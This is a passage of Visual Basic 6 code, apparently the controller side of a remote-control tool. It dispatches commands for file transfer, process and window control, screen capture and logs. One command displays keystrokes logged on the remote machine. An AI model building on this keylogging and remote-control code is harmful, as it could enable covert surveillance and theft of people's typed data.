wsk.GetData Data
If Data = "password?" Then
wsk.SendData "password:" & InputBox("Remote|Control Password?", "Locked Machine.")
End If

If frmDebug.lstReceived.ListCount > 255 Then frmDebug.lstReceived.RemoveItem (frmDebug.lstReceived.ListCount - 1)
frmDebug.lstReceived.AddItem "<" & Time & ">" & "(" & wsk.RemoteHostIP & "): " & Data, 0

If InStr(1, Data, "¤") = 0 Then Data = Data & "¤"
commands() = Split(Data, "¤")

If UBound(commands) < 1 Then
    Exit Sub
End If

For i = 0 To (UBound(commands) - 1)

    Temp() = Split(commands(i), ";", 2)
    If UBound(Temp) < 1 Then
        Exit Sub
    End If
    Command = LCase(Temp(0))
    Arguments = Temp(1)
    
    Select Case Command
    Case "authorisation"
        Send "authorisation;" & frmPassword.DescrableAuthorisation(Arguments)
    Case "error"
        RemoteError Arguments
    Case "chat"
        basProccess.Chat Arguments
    Case "sysinfo"
        basProccess.SystemInfo Arguments
    Case "response"
        Status Arguments
    Case "file"
        basProccess.GetFileList Arguments
    Case "transfer"
        basProccess.FileTransfer Arguments
    Case "process"
        basProccess.Process Arguments
    Case "window"
        basProccess.Window Arguments
    Case "rc"
        basCapture.DataArrival Arguments
    Case "fd"
        basDeclare.FileTransfer.ReceiveFile BasMain.RetrieveReservedChars(Arguments)
    Case "faction"
        basProccess.FileAction Arguments
    Case "oldlogs"
        basProccess.GetLogs Arguments
    Case "kl" 'key log
        txtKeyLog.Text = txtKeyLog.Text & Arguments
        txtKeyLog.SelStart = Len(txtKeyLog.Text)
    Case "bounce"
        basProccess.Bounce Arguments
    Case "settings"
        basProccess.LoadSettings Arguments
    End Select
    
Next i

Exit Sub
ErrorHandler:
ReportError "wsk_DataArrival", "#" & Err.Number & ": " & Err.Description
End Sub

Private Sub wsk_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Status "Winsock error: " & Description
ReportError "wsk_Error", Description
wsk_Close
End Sub

Private Sub wsk_SendComplete()
basDeclare.FileTransfer.BlockSent = True
End Sub


Sub LoadFonts(ComboBox As ComboBox)
On Error Resume Next
Dim i  As Integer
For i = 0 To Screen.FontCount - 1
ComboBox.AddItem Screen.Fonts(i)
Next i
End Sub

Sub ReceiveMessage(Nick As String, Message As String)
txtChat.Text = txtChat.Text & vbCrLf & _
Nick & ":" & vbCrLf & _
Message & vbCrLf
txtChat.SelStart = Len(txtChat)
End Sub

Private Sub wskSwitch_ConnectionRequest(ByVal requestID As Long)

    If chkAcceptIncomming.Value = 0 Then
        Status "Incomming connection ignored..."
        Exit Sub
    End If
    
    Dim result As VbMsgBoxResult
    result = MsgBox(wskSwitch.RemoteHostIP & " is trying to connect to you." & vbCrLf & _
    "Would you like to accept this connection?", vbYesNo + vbExclamation, "Connection Pending")

    If result = vbYes Then
        wsk.Close
        wsk.Accept requestID
        wsk_Connect
        
        DoEvents
        
        wskSwitch.Close
        wskSwitch.Listen
    End If

End Sub

Private Sub wskTransfer_Close()
Reset
wskTransfer.Close
tTransfer = False
BasMain.NextInQueue
End Sub

Private Sub wskTransfer_Connect()
Open tDestination For Binary Access Write As tFileNumber
End Sub

Private Sub wskTransfer_ConnectionRequest(ByVal requestID As Long)
If wskTransfer.State = sckConnected Then Exit Sub
wskTransfer.Close
wskTransfer.Accept requestID
SendFile 64
End Sub

Private Sub wskTransfer_DataArrival(ByVal bytesTotal As Long)
Dim Data As String, Temp As String

Temp = wskTransfer.State

tBytesDone = tBytesDone + bytesTotal
tBytesThisSecond = tBytesThisSecond + bytesTotal

wskTransfer.GetData Data

SetTransferStats

Put tFileNumber, , Data

If tBytesDone >= tTotalBytes Then
    Reset
    tTransfer = False
    wskTransfer.Close
    BasMain.NextInQueue
End If

Exit Sub
ErrorHandler:
Debug.Print wskTransfer.State
Reset
tTransfer = False
BasMain.NextInQueue
If wskTransfer.State = sckConnected Then wskTransfer.Close
End Sub
